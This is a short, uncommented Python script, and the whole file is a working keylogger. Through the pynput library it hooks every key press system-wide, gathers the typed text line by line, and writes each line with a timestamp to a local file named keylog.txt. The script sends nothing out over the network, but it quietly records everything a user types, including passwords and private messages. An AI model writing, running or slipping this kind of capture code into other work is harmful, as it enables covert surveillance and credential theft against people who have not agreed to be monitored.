from pynput.keyboard import Key, Listener
import logging

intercepted = ""
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format=" %(asctime)s - %(message)s")


def on_press(key):
    global intercepted
    if key == Key.enter:
        logging.info(intercepted)
        intercepted = ""
    else:
        if key != Key.shift and key != Key.cmd:
            intercepted += str(key).replace("\'", '')


with Listener(on_press=on_press) as listener:
    listener.join()
